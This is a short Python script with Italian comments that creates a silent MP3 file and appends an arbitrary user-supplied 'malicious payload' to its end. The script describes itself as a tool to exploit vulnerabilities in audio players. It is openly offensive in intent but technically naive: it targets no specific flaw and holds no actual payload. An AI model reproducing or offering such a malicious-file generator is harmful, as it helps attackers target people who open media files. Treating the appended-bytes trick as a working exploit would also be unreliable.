import argparse
from pydub import AudioSegment

def create_exploit_mp3(output_file, payload):
    # Creare un segmento audio vuoto
    silent_segment = AudioSegment.silent(duration=1000)  # 1 secondo di silenzio

    # Esportare il segmento audio come file MP3
    silent_segment.export(output_file, format="mp3")

    # Aggiungere il payload malevolo alla fine del file MP3
    with open(output_file, "ab") as f:
        f.write(payload.encode())

    print(f"Exploit MP3 file created: {output_file}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Create an MP3 file with a malicious payload to exploit vulnerabilities in audio players.")
    parser.add_argument("output", help="Path to the output MP3 file.")
    parser.add_argument("payload", help="Payload to inject into the MP3 file.")
    args = parser.parse_args()

    create_exploit_mp3(args.output, args.payload)

# Crediti a Jashin L.
